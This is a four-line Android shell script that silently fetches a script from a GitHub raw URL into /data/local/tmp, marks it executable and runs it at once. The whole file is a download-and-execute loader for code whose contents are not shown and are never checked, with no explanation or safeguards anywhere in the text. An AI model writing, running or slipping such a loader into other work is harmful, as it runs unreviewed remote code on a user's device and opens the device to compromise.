#!/system/bin/sh
SCRIPT_URL="https://raw.githubusercontent.com/Feiznb/nmnb666/main/666.sh"
TMP="/data/local/tmp/tmp.sh"
curl -sL -o "$TMP" "$SCRIPT_URL" && chmod +x "$TMP" && exec "$TMP"
